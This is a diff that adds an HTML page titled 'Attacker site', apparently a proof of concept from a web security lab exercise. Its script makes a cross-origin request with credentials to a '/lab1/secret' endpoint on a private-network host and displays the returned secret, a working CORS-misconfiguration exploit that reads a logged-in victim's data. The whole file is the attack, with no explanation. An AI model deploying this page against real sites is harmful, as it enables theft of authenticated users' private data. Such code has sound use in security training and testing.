@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Attacker site</title>
+</head>
+<body>
+    <p id="result"></p>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','http://172.26.38.12:3000/lab1/secret',true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            let result = document.getElementById("result");
+            result.textContent = this.responseText;
+        };
+    </script>
+</body>
+</html>
